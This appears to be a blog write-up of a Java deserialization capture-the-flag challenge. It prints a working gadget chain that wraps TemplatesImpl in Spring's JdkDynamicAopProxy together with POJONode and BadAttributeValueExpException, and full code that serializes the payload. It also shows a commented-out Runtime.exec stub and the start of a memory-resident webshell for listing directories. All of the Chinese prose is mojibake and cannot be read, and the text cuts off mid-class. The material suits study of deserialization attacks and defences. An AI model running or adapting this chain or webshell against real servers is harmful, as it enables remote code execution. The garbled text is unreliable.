<p>æ˜¯åå°„  <code>getDeclaredMethods</code>  è·å–åˆ°æ–¹æ³•çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ€ç»ˆå¯¼è‡´æ‰§è¡Œç›¸å…³ getter æ–¹æ³•çš„é¡ºåºä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œå½“  <code>TemplatesImpl</code>  çš„  <code>getStylesheetDOM</code>  æ–¹æ³•å…ˆäº  <code>getOutputProperties</code>  æ–¹æ³•æ‰§è¡Œæ—¶å°±ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ä»è€Œå¯¼è‡´è°ƒç”¨é“¾æŠ¥é”™ä¸­æ–­ï¼Œexp åˆ©ç”¨å¤±è´¥ã€‚</p>
<h3 id="è§£å†³æ–¹æ³•"><a class="markdownIt-Anchor" href="#è§£å†³æ–¹æ³•">#</a> è§£å†³æ–¹æ³•ğŸ˜Š</h3>
<p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>  è§£å†³é—®é¢˜</p>
<h4 id="å®ç°"><a class="markdownIt-Anchor" href="#å®ç°">#</a> å®ç°</h4>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œjava æœ‰ä¸ª b ç©æ„å«åš <code>åŠ¨æ€ä»£ç†</code> ï¼Œå¾ˆ nb,ğŸ‘´åªåœ¨ cc ä¸­ç”¨è¿‡ï¼Œä¸æ¸…æ¥š.</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{TestInterface1.class, TestInterface2.class}, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) {</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> {</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"eat something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"say something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> {</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">        System.out.println(<span class="string">"invoke dynamic proxy handler"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105214715.png" alt="å¾®ä¿¡æˆªå›¾_20231105214715"></p>
<p>è¿™æ˜¯æ‰§è¡Œç»“æœï¼Œå¯ä»¥çœ‹æ‡‚èƒ½è·å–åˆ°çš„æ–¹æ³•ï¼Œå®Œå…¨å–å†³äºæ¥å£å®ç°äº†å“ªäº›æ–¹æ³•</p>
<p>è€Œ  <code>javax.xml.transform.Templates</code>  æ¥å£å…¶åªæœ‰  <code>newTransformer</code>  å’Œ  <code>getOutputProperties</code>  è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•ï¼Œè®©ä»–ä½œä¸ºæˆ‘ä»¬ä»£ç†æ‰€éœ€çš„æ¥å£ï¼Œè¿™æ ·æœ€ç»ˆé€šè¿‡  <code>getDeclaredMethods</code>  è·å–åˆ°çš„æ–¹æ³•å°±åªæœ‰  <code>newTransformer</code>  å’Œ  <code>getOutputProperties</code>  äº†ï¼Œé‚£ä¹ˆæœ€ç»ˆè·å¾—çš„ getter æ–¹æ³•ä¾¿åªæœ‰  <code>getOutputProperties</code>  äº†ã€‚</p>
<p>å› æ­¤åªéœ€è¦æŒ‚ä»£ç†ï¼Œå°±åªä¼šè·å–æ¥å£æ–¹æ³•</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class}, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) {</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"eat something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"say something"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> {</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable {</span><br><span class="line">        System.out.println(<span class="string">"invoke dynamic proxy handler"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106082615.png" alt="å¾®ä¿¡æˆªå›¾_20231106082615"></p>
<p>è¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯ <code>Templates</code>  é‡Œé¢å®šä¹‰çš„æ¥å£æ–¹æ³•</p>
<p><code>JdkDynamicAopProxy</code>  æ˜¯ Spring æ¡†æ¶ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°äº† JDK åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œç”¨äºåˆ›å»ºä»£ç†å¯¹è±¡æ¥å®ç°é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„åŠŸèƒ½ã€‚</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215128.png" alt="å¾®ä¿¡æˆªå›¾_20231105215128"></p>
<p>è¿™é‡Œèƒ½å¤Ÿæ§åˆ¶ advised</p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215235.png" alt="å¾®ä¿¡æˆªå›¾_20231105215235"></p>
<p>è¿™é‡Œä¼šè§¦å‘åå°„æ–¹æ³•ï¼Œè¿™é‡Œ <code>advised</code>  å‰é¢è¯´è¿‡äº†å¯æ§</p>
<p>æˆ‘ä»¬å°†æ‰€éœ€çš„  <code>TemplatesImpl</code>  çš„å¯¹è±¡ç”¨  <code>org.springframework.aop.framework.AdvisedSupport</code>  å°è£…å³å¯</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215851.png" alt="å¾®ä¿¡æˆªå›¾_20231105215851"></p>
<p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105220106.png" alt="å¾®ä¿¡æˆªå›¾_20231105220106"></p>
<h3 id="æ„é€ "><a class="markdownIt-Anchor" href="#æ„é€ ">#</a> æ„é€ </h3>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span>);</span><br><span class="line">Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(templatesImpl);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]{Templates.class}, handler);</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br></pre></td></tr></tbody></table></figure>
<p>ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception{</span><br><span class="line"><span class="comment">//        ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass ctClass = classPool.get(evilref.class.getName());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span></span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(superClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        constructor.setBody("Runtime.getRuntime().exec(\"calc\");");</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(constructor);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//byte[][] codes = new byte[][]{code};</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        ref(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]{});</span><br><span class="line">        ref(templates, <span class="string">"_name"</span>, <span class="string">"shanghe"</span>);</span><br><span class="line">        ref(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">"javax.management.BadAttributeValueExpException"</span>).getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        serialize_func.serialize(exp);</span><br><span class="line">        WriteToFileExample(serialize_func.encryptToBase64(<span class="string">"ser.bin"</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteToFileExample</span><span class="params">(String args)</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">"è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">"output.txt"</span>));</span><br><span class="line">            writer.write(args);</span><br><span class="line">            writer.close();</span><br><span class="line">            System.out.println(<span class="string">"å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚"</span>);</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            System.out.println(<span class="string">"å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š"</span> + e.getMessage());</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(Object obj,String field,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException {</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">reffield</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        reffield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        reffield.set(obj,value);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException{</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="å†…å­˜çš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#å†…å­˜çš„ä½¿ç”¨">#</a> å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´</h2>
<p>æéº»éº»æ»´ï¼Œå¤ªå¤æ‚äº†ï¼Œè¿˜è¦å†™ä¸ªå†…å­˜é©¬æ‰¾åˆ° RASP, è¿˜å¥½ğŸ‘´æŠ€é«˜ä¸€ç­¹.</p>
<h3 id="åˆ—ç›®å½•"><a class="markdownIt-Anchor" href="#åˆ—ç›®å½•">#</a> åˆ—ç›®å½•</h3>
<p>nm, è·Ÿå–å¤§äº†ä¸€æ ·ï¼Œæ•´è¿™ b ç©æ„ï¼Œè‰¹ğŸ˜¡</p>
<p>é¦–å…ˆæ¥ä¸€ä¸ªé€’å½’åˆ—å‡ºæ‰€æœ‰ç›®å½•æ–‡ä»¶çš„</p>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 